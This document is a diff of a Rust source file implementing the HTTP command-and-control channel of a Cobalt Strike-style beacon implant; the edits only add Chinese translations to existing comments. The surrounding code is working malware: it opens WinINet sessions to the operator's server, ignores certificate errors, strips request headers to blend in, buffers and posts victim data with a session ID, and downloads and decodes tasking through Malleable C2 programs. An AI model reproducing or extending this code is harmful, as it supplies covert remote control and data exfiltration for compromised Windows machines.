@@ -1,3 +1,4 @@
+//! 基于 WinINet 的 HTTP C2 信道（channel.cpp）。
 //! HTTP C2 channel via WinINet (channel.cpp).
 
 use crate::beacon::{
@@ -17,6 +18,7 @@ pub const PROXYB_DIRECT: u16 = 1;
 pub const PROXYB_PRECONFIG: u16 = 2;
 pub const PROXYB_MANUAL_CREDS: u16 = 4;
 
+// SECURITY_FLAG_* 常量位于 windows-sys 0.61 的 WinHttp 模块中；C++ 将它们混入 WinINet 选项，值相同。
 // SECURITY_FLAG_* constants live in the WinHttp module in windows-sys 0.61;
 // the C++ mixes them into WinINet options. Same values.
 pub const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x100;
@@ -50,7 +52,8 @@ pub fn http_init(host: &[u8], port: u16, ua: &[u8]) {
     let timeout: u32 = 240000;
     token_guard_start();
 
-    // set HTTP flags
+    // 设置 HTTP 标志。
+    // Set HTTP flags.
     let mut flags = if is_https() { HTTPS_FLAGS } else { HTTP_FLAGS };
     if setting_short(SETTING_HTTP_NO_COOKIES) == 1 {
         flags |= INTERNET_FLAG_NO_COOKIES;
@@ -61,7 +64,8 @@ pub fn http_init(host: &[u8], port: u16, ua: &[u8]) {
     let ua_c = cstr(ua);
     let proxy_c = setting_ptr(SETTING_PROXY_CONFIG).map(|p| cstr(p));
 
-    // create session, respecting the user's proxy configuration
+    // 创建会话，遵循用户的代理配置。
+    // Create session, respecting the user's proxy configuration.
     let session_h = unsafe {
         match setting_short(SETTING_PROXY_BEHAVIOR) {
             PROXYB_PRECONFIG => InternetOpenA(
@@ -101,7 +105,8 @@ pub fn http_init(host: &[u8], port: u16, ua: &[u8]) {
         return;
     }
 
-    // 4 minute timeouts
+    // 4 分钟超时。
+    // 4 minute timeouts.
     unsafe {
         InternetSetOptionA(
             session_h,
@@ -131,7 +136,8 @@ pub fn http_init(host: &[u8], port: u16, ua: &[u8]) {
     };
     *CONNECT_H.lock() = connect_h as isize;
 
-    // if we have credentials, assign them to this connection immediately
+    // 如果有凭据，立即分配给此连接。
+    // If we have credentials, assign them to this connection immediately.
     if setting_short(SETTING_PROXY_BEHAVIOR) == PROXYB_MANUAL_CREDS {
         if let (Some(user), Some(pass)) =
             (setting_ptr(SETTING_PROXY_USER), setting_ptr(SETTING_PROXY_PASSWORD))
@@ -175,6 +181,7 @@ pub fn http_close() {
     token_guard_stop();
 }
 
+/// 在连接的最后阶段移除/调整特定请求头。
 /// Remove/adjust certain headers at the last stage of connection.
 unsafe extern "system" fn fix_request_late(
     h_internet: *const core::ffi::c_void,
@@ -198,7 +205,8 @@ unsafe extern "system" fn fix_request_late(
 
 fn fix_request(request: *mut core::ffi::c_void) {
     unsafe {
-        // if we're an SSL beacon, set these options
+        // 如果是 SSL 信标，则设置这些选项。
+        // If we're an SSL beacon, set these options.
         if is_https() {
             let mut flags: u32 = 0;
             let mut flen: u32 = std::mem::size_of::<u32>() as u32;
@@ -221,7 +229,8 @@ fn fix_request(request: *mut core::ffi::c_void) {
             );
         }
 
-        // register a callback to fix the request later
+        // 注册回调以便稍后修复请求。
+        // Register a callback to fix the request later.
         if setting_ptr(SETTING_HEADERS_REMOVE).is_some() {
             InternetSetStatusCallback(request as *const _, Some(fix_request_late));
         }
@@ -248,6 +257,7 @@ fn http_request_is_ok(request: *mut core::ffi::c_void) -> bool {
     }
 }
 
+/// 有数据要发送时发送我们的数据。
 /// Send our data if there's data to send.
 pub fn http_post_maybe(hook: &[u8]) {
     let http_post_len = state::http_post_len();
@@ -259,11 +269,13 @@ pub fn http_post_maybe(hook: &[u8]) {
     let mut myprofile = Profile::new(0);
     profile_setup(&mut myprofile, http_post_len as usize);
 
-    // set the hook to the URI
+    // 将 hook 设置为 URI。
+    // Set the hook to the URI.
     let n = hook.len().min(1024);
     myprofile.uri[..n].copy_from_slice(&hook[..n]);
 
-    // convert the ID to a string (POST request parameter)
+    // 将 ID 转换为字符串（POST 请求参数）。
+    // Convert the ID to a string (POST request parameter).
     let myid = format!("{}", state::BIGSESSION.lock().myid);
     let myid_bytes = myid.as_bytes();
 
@@ -277,7 +289,8 @@ pub fn http_post_maybe(hook: &[u8]) {
         http_post_len as usize,
     );
 
-    // build the URI
+    // 构建 URI。
+    // Build the URI.
     let params_end = myprofile
         .parameters
         .iter()
@@ -303,7 +316,8 @@ pub fn http_post_maybe(hook: &[u8]) {
     let connect_h = *CONNECT_H.lock() as *mut core::ffi::c_void;
     let httpflags = *HTTPFLAGS.lock();
 
-    // try the request, up to 5 times
+    // 尝试请求，最多 5 次。
+    // Try the request, up to 5 times.
     for _ in 0..4 {
         unsafe {
             let request = HttpOpenRequestA(
@@ -361,9 +375,11 @@ pub fn http_post_maybe(hook: &[u8]) {
     token_guard_stop();
 }
 
+/// 发送我们的数据。
 /// Send our data.
 pub fn http_put(hook: &[u8], buffer: &[u8], len: usize, post_now: bool) {
-    // allocate if needed
+    // 按需分配。
+    // Allocate if needed.
     {
         let mut post_buf = HTTP_POST_BUFFER.lock();
         if post_buf.len() < MAX_HTTP_POST {
@@ -371,17 +387,20 @@ pub fn http_put(hook: &[u8], buffer: &[u8], len: usize, post_now: bool) {
         }
     }
 
-    // sanity check so we don't send overly large files
+    // 进行合理性检查，避免发送过大的文件。
+    // Sanity check so we don't send overly large files.
     if (len + 4) > MAX_HTTP_POST {
         return;
     }
-    // if too big, send now
+    // 如果过大，立即发送。
+    // If too big, send now.
     let current = state::http_post_len() as usize;
     if (current + len + 4) > MAX_HTTP_POST {
         http_post_maybe(hook);
     }
 
-    // add length and data
+    // 添加长度和数据。
+    // Add length and data.
     let flen = (len as u32).to_be_bytes();
     let mut post_buf = HTTP_POST_BUFFER.lock();
     let mut at = state::http_post_len() as usize;
@@ -392,7 +411,8 @@ pub fn http_put(hook: &[u8], buffer: &[u8], len: usize, post_now: bool) {
     state::set_http_post_len(at as i32);
     drop(post_buf);
 
-    // execute!
+    // 执行！
+    // Execute!
     if post_now {
         http_post_maybe(hook);
     }
@@ -402,11 +422,13 @@ fn _http_get(hook: &[u8], meta: &SessData, buffer: &mut [u8], max: usize) -> i32
     let mut myprofile = Profile::new(0);
     profile_setup(&mut myprofile, meta.length);
 
-    // set the hook to the URI
+    // 将 hook 设置为 URI。
+    // Set the hook to the URI.
     let n = hook.len().min(1024);
     myprofile.uri[..n].copy_from_slice(&hook[..n]);
 
-    // apply to the profile
+    // 应用到 profile。
+    // Apply to the profile.
     let request_prog = setting_ptr(SETTING_C2_REQUEST).unwrap_or(b"");
     apply(
         request_prog,
@@ -417,7 +439,8 @@ fn _http_get(hook: &[u8], meta: &SessData, buffer: &mut [u8], max: usize) -> i32
         0,
     );
 
-    // build myuri
+    // 构建 myuri。
+    // Build myuri.
     let params_end = myprofile
         .parameters
         .iter()
@@ -483,13 +506,15 @@ fn _http_get(hook: &[u8], meta: &SessData, buffer: &mut [u8], max: usize) -> i32
 
         profile_free(&mut myprofile);
 
-        // fail if we didn't get a 200 OK
+        // 未获得 200 OK 则失败。
+        // Fail if we didn't get a 200 OK.
         if !http_request_is_ok(request) {
             InternetCloseHandle(request);
             return -1;
         }
 
-        // check what we got back
+        // 检查收到的内容。
+        // Check what we got back.
         let mut avail: u32 = 0;
         let status = InternetQueryDataAvailable(request, &mut avail, 0, 0);
         if status == 0 || avail as usize >= max {
@@ -501,7 +526,8 @@ fn _http_get(hook: &[u8], meta: &SessData, buffer: &mut [u8], max: usize) -> i32
             return 0;
         }
 
-        // download the content
+        // 下载内容。
+        // Download the content.
         let mut read: usize = 0;
         while read < max {
             let mut downloaded: u32 = 0;
@@ -527,7 +553,8 @@ fn _http_get(hook: &[u8], meta: &SessData, buffer: &mut [u8], max: usize) -> i32
 
         InternetCloseHandle(request);
 
-        // process the data we read with the Malleable C2 program
+        // 使用 Malleable C2 程序处理读取到的数据。
+        // Process the data we read with the Malleable C2 program.
         let recover_prog = setting_ptr(SETTING_C2_RECOVER).unwrap_or(b"");
         read = recover(recover_prog, &mut buffer[..read], read, max);
         read as i32
